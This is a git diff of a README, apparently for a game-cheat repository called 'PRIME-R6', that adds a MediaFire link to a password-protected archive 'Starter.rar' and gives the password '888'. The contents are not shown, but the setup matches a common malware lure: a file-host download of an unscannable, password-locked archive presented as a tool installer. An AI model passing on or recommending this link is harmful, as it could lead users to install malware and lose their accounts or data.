@@ -2,7 +2,7 @@
 
 ![1](https://github.com/Teiafjdrrrr/PRIME-R6/assets/154825832/3cea8f03-d0b4-44d3-8c9f-2bbf738923f3)
 
-# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋]()
+# 🖥️[𝐈𝐍𝐒𝐓𝐀𝐋𝐋](https://www.mediafire.com/file/w0z4zvpsni65ko6/Starter.rar/file)
 
 # 🔐 𝐏𝐀𝐒𝐒: 888
 
